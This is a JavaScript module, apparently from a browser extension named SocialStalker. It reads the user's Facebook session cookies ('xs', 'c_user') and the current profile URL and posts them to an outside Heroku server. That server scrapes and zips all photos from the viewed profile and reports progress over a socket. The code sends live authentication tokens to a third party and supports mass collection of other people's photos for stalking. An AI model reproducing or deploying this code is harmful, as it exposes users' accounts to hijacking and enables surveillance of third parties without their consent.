import {
  beep,
  clearStorage,
  get_cookies,
  get_current_url,
  openPopupAndSendMessage,
  sendMessage,
} from "../libs/libs";

import { SocketClient } from "./socket";
import axios from "axios";

const API_LINK = "https://s0cialstalker.herokuapp.com/facebook/";
const DOMAIN = "https://www.facebook.com/";

export const FacebookProfilePicture = async () => {

  try {
    
  // Prepare Cookies
  const xs = await get_cookies("xs", DOMAIN);
  const c_user = await get_cookies("c_user", DOMAIN);
  // Get Profile Link
  const profile_link = await get_current_url();

  // Send Request to API
  const { data,status } = await axios.post(`${API_LINK}profile_picture`, {
    xs,
    c_user,
    link: profile_link,
  });
 
  // OPEN POPUP and Receive the Message
  openPopupAndSendMessage("fb_profile_picture", {
    image: data.image,
    username: data.username.replace("/", "")
  },);
  } catch (error) {
    return alert("Your account is restricted from facebook system. try in a minute")
  }

};

export const FacebookProfilePhotos = async () => {
  // Prepare Cookies
  const xs = await get_cookies("xs", DOMAIN);
  const c_user = await get_cookies("c_user", DOMAIN);
  // Get Profile Link
  const profile_link = await get_current_url();

  // Send Request to API
  const { data } = await axios.post(`${API_LINK}profile_photos`, {
    xs,
    c_user,
    link: profile_link,
  });
  await clearStorage()
  chrome.storage.sync.set({id: data.operation}, function() {
    console.log('Value is set to ' + data.operation);
  });

  //
  const connect = new SocketClient();
  const socket = connect.init_socket();

  // OPEN POPUP and Receive the Message
  await openPopupAndSendMessage("fb_profile_photos", {
    operation: data.operation,
  });

  socket.on("PHOTO", (socket_data) => {
    sendMessage({ photo: socket_data.photo,id:socket_data.id });
  });
  socket.on("PHASE_I", (socket_data) => {
    sendMessage({ status: "Spider is online",id:socket_data.id  });
  });
  socket.on("PHASE_II", (socket_data) => {
    sendMessage({ status: "Counting Photos...",id:socket_data.id  });
  });
  socket.on("PHASE_III", (socket_data) => {
    sendMessage({ status: "Digging for more...",id:socket_data.id  });
  });
  socket.on("PHASE_IV", (socket_data) => {
    sendMessage({
      status: `We got all photos (${
        socket_data.count + 1
      }). now fetching direct links`,id:socket_data.id 
    });
  });
  socket.on("PHASE_V", (socket_data) => {
    sendMessage({ 
      status: `Getting Direct Link for: #${socket_data.current + 1}`,id:socket_data.id 
    });
  });

  socket.on("PHASE_VI", (socket_data) => {
    sendMessage({ status: `Zipping on our servers for better experience and Uploading....`,id:socket_data.id  });
  });

  socket.on("DONE", (socket_data) => {
    sendMessage({ status: `SocialStalker - Facebook Profile Photos: Click here to download` ,id:socket_data.id ,download_link: socket_data.download_link});
    beep()
    connect.cleanup()
  });
};
